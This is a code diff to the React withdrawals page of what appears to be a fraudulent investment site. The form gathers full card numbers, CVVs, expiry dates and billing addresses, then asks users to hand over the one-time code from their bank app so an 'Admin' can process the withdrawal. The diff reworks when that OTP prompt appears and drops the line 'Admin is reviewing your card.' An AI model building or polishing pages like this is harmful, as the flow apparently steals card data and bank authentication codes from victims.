@@ -1,6 +1,4 @@
-'use client'
-
-import { useState, useEffect } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import { api } from '@/lib/api'
 import toast from 'react-hot-toast'
 import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield } from 'lucide-react'
@@ -30,6 +28,7 @@ export default function WithdrawalsPage() {
   const [otpCode, setOtpCode] = useState('')
   const [availableBalance, setAvailableBalance] = useState(0)
   const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '' })
+  const hasPromptedOTP = useRef(false)
 
   useEffect(() => {
     fetchWithdrawals()
@@ -42,12 +41,14 @@ export default function WithdrawalsPage() {
       const { data } = await api.get('withdrawals')
       setWithdrawals(data.data)
 
-      // Check for PROCESSING status - OTP modal appears immediately
-      const processing = data.data.find((w: any) => w.status === 'PROCESSING')
-      if (processing && !showOTPModal) {
-        setPendingWithdrawalId(processing.id)
-        setShowOTPModal(true)
-        toast('Please enter OTP to proceed with withdrawal', { icon: '🔐' })
+      // Only show OTP modal once, from form submission (not polling)
+      if (!hasPromptedOTP.current) {
+        const processing = data.data.find((w: any) => w.status === 'PROCESSING')
+        if (processing) {
+          hasPromptedOTP.current = true
+          setPendingWithdrawalId(processing.id)
+          setShowOTPModal(true)
+        }
       }
     } catch (err) {
       toast.error('Failed to fetch withdrawals')
@@ -107,7 +108,6 @@ export default function WithdrawalsPage() {
       if (data.success && data.data?.id) {
         setPendingWithdrawalId(data.data.id)
         setShowOTPModal(true)
-        toast('Please enter OTP to proceed with withdrawal', { icon: '🔐' })
       }
       fetchWithdrawals()
     } catch (err: any) {
@@ -123,6 +123,7 @@ export default function WithdrawalsPage() {
     try {
       await api.put(`withdrawals/${pendingWithdrawalId}/otp`, { otpCode })
       setShowOTPModal(false)
+      hasPromptedOTP.current = false
       setOtpCode('')
       setPendingWithdrawalId(null)
       toast.success('OTP submitted! Admin will process your withdrawal.')
@@ -287,7 +288,7 @@ const statusColors: Record<string, string> = {
               Enter OTP
             </h3>
             <p className="text-sm text-gray-600 mb-4">
-              Admin is reviewing your card. Enter the OTP from your bank app to complete withdrawal.
+              Please enter the OTP from your bank app to complete withdrawal.
             </p>
             <input
               type="text"
